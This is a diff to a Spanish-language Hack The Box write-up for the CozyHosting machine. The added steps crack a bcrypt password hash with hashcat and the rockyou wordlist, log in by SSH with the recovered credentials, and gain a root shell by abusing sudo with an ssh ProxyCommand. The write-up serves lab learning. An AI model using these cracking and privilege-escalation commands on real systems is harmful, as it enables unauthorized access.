@@ -210,12 +210,75 @@ SELECT * FROM users;
 - Ahora te recomiendo que descargues la wordlist para la fuerza bruta.
 ```
 git clone https://github.com/danielmiessler/SecLists.git
-``` 
+```
+- Buscamos en root la carpeta descargada y entre tantos txt, buscamos el que diga rockyou.txt, ese archivo lo agarramos y lo extreamos en el escritorio. 
 - Lo que haremos sera copiar la contraseña hasheada y la pegaremos en el siguiente hash, quedando algo asi.
 ```
 echo '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' >hashes
 ```
+-Luego
 ```
-hashcat -m 3200 hashes --wordlist /usr/share/wordlists/rockyou.txt --force
+hashcat -m 3200 hashes --wordlist /home/kali/Desktop/rockyou.txt --force
 ```
+
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/0334ed88-e849-4515-baef-53f0332a916c)
+
+- Ya que haya acabado, le pedimos que nos muestre
+```
+hashcat -m 3200 hashes --wordlist /home/kali/Desktop/rockyou.txt --force --show
+
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3f6c9749-8fe9-4423-8dc4-01b10b538490)
+
+- Tenemos que la contraseña es "manchesterunited"
+  
+- Ahora nos falta saber el usario, para eso simplemente indagamos en el SSH.
+- regremos a la tabla, no salimos de la con q + enter.
+- para salirnos del usario actual, escribimos
+```
+\q
+```
+-Luego, nos vamos a home. Pues esa carpeta no la hemos revisado
+```
+cd /home
+```
+- Aplicamos un ls
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b0f1ed1c-8fc0-43c5-8e4e-09e4f3850efd)
+- y tenemos que el usario es josh
+- usario:josh contraseña:manchesterunited
+
+## Parte final
+
+- Nos basamos de una estructura comun de ssh para acceder. Sabemos que la ip de la maquina que atacamos es 10.10.11.230, con eso en mente escribimos
+```
+ssh josh@10.10.11.230
+
+```
+
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/fa81870d-09ea-46cd-92ce-6f3226d16c68)
+
+
+- ponemos la contraseña encontrada manchesterunited
+- y ahora si estamos dentro.
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/680b8a1b-7464-46e1-ad95-b46b923f758c)
+- para finalizar, ya podemos encontrar las banderas.
+- con un comando sudo -l, vemos que carpetas hay en la maquina
+```
+sudo -l
+
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/2d258608-93f8-4a04-b62b-7589f0aee715)
+
+- metemos el siguiente comando
+  ```
+  sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+  ```
+
+- Banderas
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/8851bdf8-2e18-4c2f-bd7e-80e37910aea5)
+
+
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a0d256da-f3a4-4c78-9160-557c8fe4fb11)
+
+
 
